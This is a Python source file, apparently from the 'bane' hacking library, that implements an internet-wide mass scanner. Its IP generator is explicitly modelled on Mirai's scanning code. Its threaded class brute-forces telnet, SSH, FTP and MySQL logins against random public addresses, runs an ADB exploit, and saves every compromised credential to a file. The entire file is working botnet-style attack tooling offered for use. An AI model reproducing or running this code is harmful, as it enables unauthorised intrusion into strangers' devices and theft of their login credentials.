import os,sys,socket,random,time,threading,xtelnet
from bane.payloads import *
from bane.vulns import adb_exploit,exposed_telnet
from ftplib import FTP

import mysqlcp
from bane.bruteforcer import *
from bane.extrafun import write_file

def getip():
 '''
   this function was inspired by the scanning file in mirai's source code to returns a safe IP to bruteforce.
'''
 d=[3,6,7,10,11,15,16,21,22,23,26,28,29,30,33,55,56,127,214,215]
 f=[100,169,172,198]
 while True:
  o1=random.randint(1,253)
  o2=random.randint(0,254)
  if (o1 not in d):
   if o1 in f:
    if ((o1==192)and(o2!=168)):
     return '{}.{}.{}.{}'.format(o1,o2,random.randint(0,255),random.randint(0,255))
    if ((o2==172)and((o2<=16)and(o2>=32))):
     return '{}.{}.{}.{}'.format(o1,o2,random.randint(0,255),random.randint(0,255))
    if((o1==100)and(o2!=64)):
     return '{}.{}.{}.{}'.format(o1,o2,random.randint(0,255),random.randint(0,255))
    if((o1==169)and (o2!=254)):
     return '{}.{}.{}.{}'.format(o1,o2,random.randint(0,255),random.randint(0,255))
    if((o1==198)and(o2!=18)):
     return '{}.{}.{}.{}'.format(o1,o2,random.randint(0,255),random.randint(0,255))
   else:
    return '{}.{}.{}.{}'.format(o1,o2,random.randint(0,255),random.randint(0,255))
'''
  the following functions are used to scan safe IPs all over the internet with a word_list, it can scan bruteforce their: ftp, ssh, telnet, smtp and mysql logins then save them on text files in the same directory.
  it's highly recommended to be used with a VPS or your slow internet speed will be an obstacle to your scan.
'''

class mass_scan:
 def __init__(self,file_name="results.txt",protocol="telnet",logs=True,threads=100,word_list=[],ip_range=None,timeout=7,p=23):
  self.word_list=word_list
  self.logs=logs
  self.protocol=protocol.lower()
  self.stop=False
  self.ip_range=ip_range
  self.timeout=timeout
  self.port=p
  self.found=[]
  self.file_name=file_name
  for x in range(threads):
   t=threading.Thread(target=self.scan)
   t.daemon=True
   t.start()
 def scan(self):
  time.sleep(1)
  while True:
   try:
    if self.stop==True:
         break
    if self.ip_range==None:
     ip=getip()
    else:
     ip=self.ip_range.format(random.randint(0,255),random.randint(0,255),random.randint(0,255),random.randint(0,255))
    i=False
    try:
     so=socket.socket()
     so.settimeout(self.timeout)
     so.connect((ip,self.port))
     i=True
     so.close()
    except:
     pass
    if self.stop==True:
         break
    if i==True:
     if self.protocol=="adb":
      q=adb_exploit(ip,timeout=self.timeout,p=self.port)
      if q==True:
       res="adb:{}:{}".format(ip,self.port)
       write_file(res,self.file_name)
       self.found.append(res)
       if self.logs==True:
         print(res)
     else:
      if self.protocol=="ssh":
       func=ssh
      elif self.protocol=="telnet":
       func=telnet
      elif self.protocol=="ftp":
       func=ftp
      elif self.protocol=="mysql":
       func=mysql
      for x in self.word_list:
       if self.stop==True:
         break
       try:
        username=x.split(':')[0]
        password=x.split(':')[1]
        q=func(ip,username,password,timeout=self.timeout,p=self.port)
        if q==True:
         res="{}:{}:{}:{}:{}".format(self.protocol,ip,self.port,username,password)
         write_file(res,self.file_name)
         self.found.append(res)
         if self.logs==True:
          print(res)
         break
       except:
        pass
   except:
        pass
 def reset(self):
   l=[]
   for x in self.__dict__:
    self.__dict__[x]=None
    l.append(x)
   for x in l:
    delattr(self,x)
 def kill(self):
  self.stop=True
  a=self.__dict__["found"]
  self.reset()#this will kill any running threads instantly by setting all the attacking information to "None" and cause error which is handled with the "try...except..." around the main while loop
  return a
